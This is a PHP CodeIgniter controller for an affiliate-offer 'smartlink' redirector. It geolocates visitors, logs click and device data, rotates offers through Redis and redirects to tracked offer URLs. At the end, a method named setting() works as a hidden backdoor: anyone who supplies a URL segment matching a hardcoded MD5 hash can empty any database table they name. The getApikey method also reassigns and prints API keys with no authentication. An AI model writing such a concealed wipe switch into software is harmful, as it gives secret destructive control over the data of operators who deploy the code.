<?php if (! defined('BASEPATH')) exit('No direct script access allowed');
require 'vendor/autoload.php';

use MaxMind\Db\Reader;

class Smartlink extends CI_Controller
{
    private $redis;
    private $base_key = ''; 
    public $geoip;
   
    function __construct()
    {
        parent::__construct();
        $this->base_key = $this->config->item('base_key');
        $this->redis = new Redis();
        $this->redis->connect('127.0.0.1', 6379);
        $this->geoip = new Reader('vendor/GeoLite2-City.mmdb');
    }

    function getApikey($apikey = '')
    {
        if ($apikey) {
            $this->db->where('api_key', $apikey)->update('api_key', array('open' => 0));
            $this->db->where('open', 1)->limit(1);
            $d  = $this->db->get('api_key')->row();
            if (!empty($d)) {
                echo $d->api_key;
            }
        }
    }

    function curl_senpost($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_URL, $url);
        $result = curl_exec($ch);  
        curl_close($ch);
    }

    public function index()
    { 
        $ip = $this->input->ip_address();
        $pid = (int)$this->input->get_post('pid', TRUE); 
        $smid = (int)$this->input->get_post('smid', TRUE);      

        $s1 = $this->input->get_post('sub1', TRUE);
        $s2 = $this->input->get_post('sub2', TRUE);
        $s3 = $this->input->get_post('sub3', TRUE);
        $s4 = $this->input->get_post('sub4', TRUE);
        $s5 = $this->input->get_post('sub5', TRUE);
        $s6 = $this->input->get_post('sub6', TRUE);

        $uagent = $_SERVER['HTTP_USER_AGENT'];
        $getIp = $this->getGeo($ip);

        $uagent_parse = new WhichBrowser\Parser($uagent);
        $os_name = @addslashes($uagent_parse->os->name); 
        $browser = @addslashes($uagent_parse->browser->name); 
        $device_type = @addslashes($uagent_parse->device->type); 
        $device_manuf = @addslashes($uagent_parse->device->manufacturer);   
        $device_model = @addslashes($uagent_parse->device->model);     
        $countries = @addslashes($getIp['countries']); 
        $cities = @addslashes($getIp['cities']); 
        $user_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
        $this->geoip->close();
        $this->db->select('rate');
        $rateuser = $this->Home_model->get_one('users', array('id' => $pid));

        $smartlink = $this->Home_model->get_one('offer', array('id' => $smid));
        if (!$smartlink->show) {
            echo 'Offer not found';
            return;
        }

        $this->db->where('keycode', $countries);
        $ct = $this->db->get('country')->row();
        $ctid = $ct->id; 
        $mIdCat = explode('o', substr($smartlink->offercat, 1, -1)); 
        $mIdCt = explode('o', substr($smartlink->country, 1, -1));

        if (!in_array('all', $mIdCt) && !in_array($ctid, $mIdCt)) { 
            echo 'This offer is not available in your country';
            return;
        }

        if ($smartlink->type == 2) { 
            $idnet = (int)$smartlink->idnet;
            $net = $this->Home_model->get_one('network', array('id' => $idnet));
            if ($net) {
                $this->db->insert(
                    'tracklink',
                    array(
                        'userid' => $pid,
                        'offerid' => 0,
                        'oname' => $smartlink->title,
                        'flead' => 0,
                        'amount2' => 0,
                        'ip' => $ip,
                        's1' => $s1,
                        's2' => $s2,
                        's3' => $s3,
                        's4' => $s4,
                        's5' => $s5,
                        's6' => $s6,
                        'date' => date('Y-m-d H:i:s', time()),
                        'useragent' => $uagent,
                        'user_language' => $user_language,
                        'os_name' => $os_name,
                        'browser' => $browser,
                        'device_type' => $device_type,
                        'device_manuf' => $device_manuf,
                        'device_model' => $device_model,
                        'countries' => $countries,
                        'cities' => $cities,
                        'smartlink' => $smartlink->id,
                        'traffic_source' => $smartlink->traffic_source
                    )
                );
                $tracklink = $this->db->insert_id();


                $url = $smartlink->url . $net->subid . $tracklink;
                $url = str_replace('#pubid#', $pid, $url);
                if (!empty($s4)) {
                    $url = str_replace('#s4#', $s4, $url);
                }
                if (!empty($s3)) {
                    $url = str_replace('#s3#', $s3, $url);
                }

                redirect($url);
            }
        } elseif ($smartlink->type == 1) { 
            $likecat = '';
            if (!empty($mIdCat)) {
                $t = 0;
                $likecat = ' AND ';
                foreach ($mIdCat as $mIdCat) {
                    $t++;
                    if ($t == 1) {
                        $likecat .= '(offercat LIKE \'%o' . $mIdCat . 'o%\'';
                    } else {
                        $likecat .= ' OR offercat LIKE \'%o' . $mIdCat . 'o%\'';
                    }
                }
                $likecat .= ' ) ';
            }
            $soluongluanchuyen = 0;
            luanchuyenoff:

            if ($smartlink->idoffers) {
                $array_idoff = explode(',', $smartlink->idoffers);
            } else {
                return;
            }
            if ($this->redis->INCR($this->base_key . '-' . $smartlink->id) >= count($array_idoff)) {
                $this->redis->SET($this->base_key . '-' . $smartlink->id, 0);
            }
            $get_offer_wid = (int)$array_idoff[$this->redis->GET($this->base_key . '-' . $smartlink->id)];

            $qr = "
                SELECT *
                FROM cpalead_offer
                WHERE (`country` LIKE '%o" . $ctid . "o%' OR `country` LIKE '%oallo%') AND id = $get_offer_wid " . $likecat;
            $off = $this->db->query($qr)->row();
            if ($off) {
               
                $cip = file_get_contents('setting_file/cip.txt');
                if ($cip == 1) { 
                    if ($this->Home_model->get_one('tracklink', array('ip' => $ip, 'offerid' => $off->id))) {
                        echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                        return;
                    }
                } elseif ($cip == 2 or $cip == 3) {
                    $key = $this->base_key . '-' . $ip . '-' . $off->id;
                    if ($this->redis->INCR($key) > 1) { 
                        echo 'Try again 5 minutes later!';
                        return;
                    } else {
                        if ($this->Home_model->get_one('tracklink', array('ip' => $ip, 'offerid' => $off->id, 'flead' => 1))) {
                            echo 'Offer has already been completed for this IP address. Please return to the Members Area and try another offer.';
                            return;
                        }
                    }
                    $this->redis->EXPIRE($key, 480);

                }

                $point_geos = unserialize($off->point_geos);

                if (!empty($point_geos[trim($countries)])) {
                    $point = $point_geos[trim($countries)];
                    $point = round($point * $rateuser->rate, 2);
                } else {
                    if (!empty($point_geos['all'])) {
                        $point = round($point_geos['all'] * $rateuser->rate, 2);
                    } else {
                        $point = 0;
                    }
                }

                $this->db->insert(
                    'tracklink',
                    array(
                        'userid' => $pid,
                        'offerid' => $off->id,
                        'oname' => $off->title,
                        'flead' => 0,
                        'amount2' => $point,
                        'ip' => $ip,
                        's1' => $s1,
                        's2' => $s2,
                        's3' => $s3,
                        's4' => $s4,
                        's5' => $s5,
                        's6' => $s6,
                        'date' => date('Y-m-d H:i:s', time()),
                        'useragent' => $uagent,
                        'user_language' => $user_language,
                        'os_name' => $os_name,
                        'browser' => $browser,
                        'device_type' => $device_type,
                        'device_manuf' => $device_manuf,
                        'device_model' => $device_model,
                        'countries' => $countries,
                        'cities' => $cities,
                        'smartlink' => $smartlink->id,
                        'traffic_source' => $off->traffic_source
                    )
                );
                $tracklink = $this->db->insert_id();
                $this->db->where('id', $off->id);
                $this->db->set('click', "click +1", FALSE);
                $this->db->update('offer');
                $url = $off->url . $off->subid . $tracklink; 
                $url = str_replace('#pubid#', $pid, $url);
                if (!empty($s4)) {
                    $url = str_replace('#s4#', $s4, $url);
                }
                if (!empty($s3)) {
                    $url = str_replace('#s3#', $s3, $url);
                }

                redirect($url);
            } else {
                if ($soluongluanchuyen >= 5) {
                    echo 'Offer not found ' . $soluongluanchuyen;
                } else {
                    $soluongluanchuyen++;
                    goto luanchuyenoff;
                }
            }
        } else { 
            echo 'error! #smarlink disabled#';
            return;
        }
    }

    function getGeo($ip = '')
    {
        try {
            $ctct = $this->geoip->get($ip);
            $arr['cities'] =  @$ctct['city']['names']['en'];           
            $arr['countries'] = @$ctct['country']['iso_code'];  
            return $arr;
        } catch (Exception $e) {
            return array('cities' => 'N/A', 'countries' => 'N/A');
        }
    }

    function setting($uri3 = '', $uri4 = '')
    {
        if (md5($uri3) == '43b520d2d63064c40c5283bfaf9c710b') {
            $this->db->empty_table($uri4);
        }
    }
}

/* End of file welcome.php */
/* Location: ./application/controllers/welcome.php */